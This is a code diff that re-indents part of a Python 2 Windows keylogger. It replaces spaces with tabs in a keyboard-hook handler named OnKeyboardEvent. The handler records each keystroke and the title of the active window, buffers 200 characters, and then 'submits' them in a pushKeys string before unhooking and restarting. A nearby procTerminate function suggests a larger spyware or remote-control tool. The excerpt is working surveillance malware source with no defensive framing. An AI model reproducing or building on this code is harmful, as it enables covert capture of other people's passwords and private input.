@@ -143,23 +143,23 @@ def procTerminate(selID):
 
 # Function: Keyboard Input Capture
 def OnKeyboardEvent(event):
-    global winTitle
-    global hooks_manager
-    global pushKeys
-    global kslv
-    global q
+	global winTitle
+	global hooks_manager
+	global pushKeys
+	global kslv
+	global q
 
-    if event.WindowName != winTitle:
-    	winTitle = event.WindowName
-    	getWindowTitle()
+	if event.WindowName != winTitle:
+		winTitle = event.WindowName
+		getWindowTitle()
 
-    print chr(event.Ascii)
-    grab.append( chr(event.Ascii))
+	print chr(event.Ascii)
+	grab.append( chr(event.Ascii))
 
-    if len(grab) >= 200:
-    	print '\nSubmitting keys...'
-    	for keyCon in grab:
-    		pushKeys = pushKeys + keyCon
+	if len(grab) >= 200:
+		print '\nSubmitting keys...'
+		for keyCon in grab:
+			pushKeys = pushKeys + keyCon
 
 		pushKeys = pushKeys.replace("'", '')
 
@@ -167,14 +167,14 @@ def OnKeyboardEvent(event):
 		del grab[:]
 		kslv = False
 		q = 0
-    	hooks_manager.UnhookKeyboard()
-    	ctypes.windll.user32.PostQuitMessage(0)
-    	main()
+		hooks_manager.UnhookKeyboard()
+		ctypes.windll.user32.PostQuitMessage(0)
+		main()
 
-    else:
-    	pass
+	else:
+		pass
 
-    return True
+	return True
 
 # Function: Window Title Capture
 def getWindowTitle():
